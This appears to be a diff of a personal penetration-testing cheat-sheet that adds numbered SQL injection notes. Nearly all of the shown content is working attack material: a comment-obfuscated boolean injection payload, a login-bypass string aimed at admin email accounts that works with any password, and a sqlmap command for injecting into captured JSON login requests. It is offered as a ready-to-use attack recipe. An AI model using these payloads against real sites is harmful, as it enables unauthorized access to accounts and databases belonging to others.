@@ -237,12 +237,13 @@ cat nmap_scan.txt | grep open http://pic.example.com
 ----------------------------------------------------------------------------------------------
                         SQLI 
           
-AAAA')/**/or/**/(select/**/1)=1%23
+1- AAAA')/**/or/**/(select/**/1)=1%23
 
 login 
-  ' or 1=1 and email like ('%admin%'); -- 
-  any password
-
+2-   ' or 1=1 and email like ('%admin%'); -- 
+          any password
+3- if there was json {} with email or password request use sqlmap  first put whole request in file.txt ==>
+    sqlmap -r request.txt -p email or (password)
 
 
 ----------------------------------------------------------------------------------------------
